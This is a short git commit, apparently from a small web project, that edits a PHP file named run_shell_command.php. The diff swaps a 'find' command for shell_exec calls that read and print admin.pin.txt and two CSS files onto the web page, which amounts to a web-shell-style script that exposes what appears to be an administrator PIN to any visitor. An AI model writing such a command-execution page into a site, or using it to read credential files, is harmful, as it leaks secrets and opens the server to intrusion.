88486ff7bbe5b690769650e70f1e23a6225005ec
OceanPak <21999617+OceanPak@users.noreply.github.com>
2021-02-26 22:10:19 +0800

    try again

--- run_shell_command.php
+++ run_shell_command.php
@@ -1,4 +1,8 @@
 <?php
-$output = shell_exec("find");
+$output = shell_exec("cat admin.pin.txt");
 echo "<pre>$output</pre>";
+$output2 = shell_exec("cat home.css");
+echo "<pre>$output2</pre>";
+$output3 = shell_exec("cat index.css");
+echo "<pre>$output3</pre>";
 ?>
